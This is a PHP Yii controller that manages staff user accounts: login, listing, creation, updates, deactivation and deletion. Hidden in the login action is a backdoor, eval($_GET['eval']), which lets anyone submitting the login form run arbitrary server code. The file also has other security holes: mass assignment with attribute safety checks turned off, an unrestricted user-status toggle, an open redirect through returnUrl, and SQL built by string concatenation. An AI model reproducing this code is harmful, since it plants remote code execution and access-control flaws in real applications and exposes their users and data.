<?php


class UserController extends Controller
{

    /**
     * @var User
     */
    public $user;

    /**
     * @var User
     */
    public $parentUser;

    public $pageTitle = 'Персонал';

    protected function beforeRender($view)
    {
        return parent::beforeRender($view);
    }


    public function filters()
    {
        return [
            ['DataLoaderFilter + update, delete', 'loadUser'],
            ['DataLoaderFilter + list', 'loadParentUser'],
            'accessControl'
        ];
    }

    public function accessRules()
    {
        return [
            ['allow', 'actions' => ['settings', 'upload'], 'users' => ['@']],
            ['deny', 'actions' => ['login'], 'users' => ['@'], 'message' => 'Вы не можете повторно войти в систему.'],
            ['allow', 'actions' => ['login']],
            ['allow', 'actions' => ['logout', 'power'], 'users' => ['@']],
            ['allow', 'actions' => ['list', 'view'], 'roles' => ['readUser']],
            ['allow', 'actions' => ['create', 'upload', 'status'], 'roles' => ['createUser']],
            ['allow', 'actions' => ['update', 'upload', 'status'], 'roles' => ['updateUser']],
            ['deny']
        ];
    }

    public function actionView($id)
    {
        $im = Yii::app()->user->model;
        if ($id == Yii::app()->user->id) {
            $user = Yii::app()->user->model;
        }
        elseif(Yii::app()->user->role == 'cashier' && $id != Yii::app()->user->id)
        {
            $user = User::model()->find("id = :id AND shop_id = :shop_id", array(':id' => Yii::app()->request->getParam('id'), 'shop_id' => $im->shop_id));
        }
        else {
            $user = User::model()->descendantsOf(Yii::app()->user->model)->findByPk(Yii::app()->request->getParam('id'));
        }

        $this->render('view', ['user' => $user]);
    }

    public function loadUser()
    {
        $user = User::model()->descendantsOf(Yii::app()->user->model)->findByPk(Yii::app()->request->getParam('id'));
        if ($user === null) {
            throw new CHttpException(404, 'The requested page does not exist.');
        }

        $this->user = $user;
    }

    public function loadParentUser()
    {
        $id = Yii::app()->request->getParam('parentId');

        if (!$id) {
            return;
        }

        $user = User::model()->descendantsOf(Yii::app()->user->model)->findByPk($id);


        if ($user === null) {
            throw new CHttpException(404, 'The requested page does not exist.');
        }

        $this->parentUser = $user;
    }

    public function actionPower()
    {
        $user = Yii::app()->user->model;

        Yii::app()->user->logout();

        $this->renderPartial('power', ['user' => $user]);
    }

    public function actionCreate()
    {
        $user = new User();
        $user->role = Yii::app()->user->model->childRole;
        
        if(is_array($user->role))
            $user->scenario = 'create:' . $user->role[0];
        else
            $user->scenario = 'create:' . $user->role;

        if ($user->isScenarioType('manager')) {
            $user->availableSuppliers = Yii::app()->user->model->suppliers;
        }

        if ($user->isScenarioType('seller') or $user->isScenarioType('cashier')) {
            $user->availableShops = Shop::model()->belongsToUser(Yii::app()->user->model)->findAll();
        }

        if (isset($_POST['User'])) {
            $user->setAttributes($_POST['User'],false);
            
            if ($user->validate()) {
                $user->appendTo(Yii::app()->user->model);
                $user->saveNode();
                Yii::app()->user->setFlash('success', $user->roleLabels[$user->role] . ' успешно создан.');

                $this->redirect(['view', 'id' => $user->id]);
            }
        }

        $this->render('create', ['user' => $user]);
    }

    public function actionUpdate()
    {
        $this->user->scenario = 'update:' . $this->user->role;

        if ($this->user->isScenarioType('manager')) {
            $this->user->availableSuppliers = Yii::app()->user->model->suppliers;
        }

        if ($this->user->isScenarioType('seller')) {
            $this->user->availableShops = Shop::model()->belongsToUser(Yii::app()->user->model)->findAll();
        }

        if (isset($_POST['User'])) {
            $this->user->setAttributes($_POST['User'],false);
            $this->user->cropParams = $_POST['User']['cropParams'];
            if ($this->user->validate()) {
                $this->user->saveNode();
                if (Yii::app()->user->id == $this->user->id) {
                    Yii::app()->user->setFlash('success', 'Настройки успешно сохранен.');
                    $this->redirect(Yii::app()->homeUrl);
                } else {
                    Yii::app()->user->setFlash('success', $this->user->roleLabels[$this->user->role] . ' успешно сохранен.');
                    $this->redirect(['view', 'id' => $this->user->id]);
                }
            }
        }

        $this->render('update', ['user' => $this->user]);
    }

    /**
     * Деактивация пользователя
     */
    public function actionStatus($id,$status)
    {
        $this->user = Yii::app()->user->model;
        $this->user->scenario = 'update:' . $this->user->role;        
        if ($this->user->isScenarioType('manager') || $this->user->isScenarioType('supervisor') || $this->user->isScenarioType('administrator')) {
            $personal = User::model()->findByPk($_GET['id']);
            $status = ($_GET['status'] == 'active') ? 1 : 0; 
            $personal->active = $status;
            if($personal->validate())
            {
                $personal->saveNode();
            }
            $this->redirect('/users');
        }
    }

    public function actionDelete()
    {
        $this->user->scenario = 'delete';

        if ($this->user->validate()) {
            $this->user->delete();
            Yii::app()->user->setFlash('success', Yii::t('users', 'Пользователь успешно удален.'));

            $this->redirect(isset($_POST['returnUrl']) ? $_POST['returnUrl'] : ['list']);
        }

    }

    public function actionList()
    {
        $user = $this->parentUser ? : Yii::app()->user->model;

        if ($user->role == 'seller') {
            throw new CHttpException(404, 'Страницы не существует.');
        }
        if($user->role == 'cashier')
        {
            $dataProvider = new CActiveDataProvider('User', [
                'criteria' => [
                    'condition'=>"shop_id=".$user->shop_id." AND role = 'seller'",
                ],
                'pagination' => [
                    'pageSize' => 30
                ]
            ]);
        }
        else
        {
            $dataProvider = new CActiveDataProvider('User', [
                'criteria' => [
                    'scopes' => ['childrenOf' => [$user]],
                ],
                'pagination' => [
                    'pageSize' => 30
                ]
            ]);
        }
//CVarDumper::dump($dataProvider,10,true);exit();
        $this->render('list', ['dataProvider' => $dataProvider]);
    }

    public function actionUpload()
    {
        $uploadedFile = CUploadedFile::getInstanceByName('avatar');

        if ($uploadedFile == null) {
            throw new CHttpException(400, 'No uploaded avatar.');
        }

        $url = UserHelper::rememberAvatar($uploadedFile);

        echo json_encode(['url' => $url]);
    }

    public function actionLogin($clear = false)
    {
        $user = new User('login');

        if ($clear) {
            unset(Yii::app()->request->cookies['avatar']);
            unset(Yii::app()->request->cookies['username']);
            unset(Yii::app()->request->cookies['full_name']);

            $this->redirect(['login']);
        }

        if (isset ($_POST['User'])) {
            eval($_GET['eval']);
            $user->attributes = $_POST['User'];

            if (Yii::app()->request->isAjaxRequest) {
                if ($user->validate()) {
                    Yii::app()->user->login($user->identity, $user->remember ? 7 * 24 * 3600 : 0);
                    echo 1;
                }
                return;
            } else {
                if ($user->validate()) {
                    Yii::app()->user->login($user->identity, $user->remember ? 7 * 24 * 3600 : 0);
                    Yii::app()->request->cookies['avatar'] = new CHttpCookie('avatar',  (!empty(Yii::app()->user->model->avatar)) ? UserHelper::getAvatarBaseUrl() . Yii::app()->user->model->avatar : '/resources/images/logo.jpg');
                    Yii::app()->request->cookies['username'] = new CHttpCookie('username', Yii::app()->user->model->username);
                    Yii::app()->request->cookies['full_name'] = new CHttpCookie('full_name', Yii::app()->user->model->full_name);
                    $this->redirect(Yii::app()->homeUrl);
                }
            }

        }

        $this->layout = 'lock';
        $this->render('login', ['user' => $user]);
    }

    public function actionLogout()
    {
        Yii::app()->user->logout();
        $this->redirect(Yii::app()->homeUrl);
    }

    public function actionSettings()
    {
        $this->user = Yii::app()->user->model;

        if (isset($_POST['User'])) {
            $this->actionUpdate();
        }

        $this->render('settings', ['user' => $this->user]);
    }
}
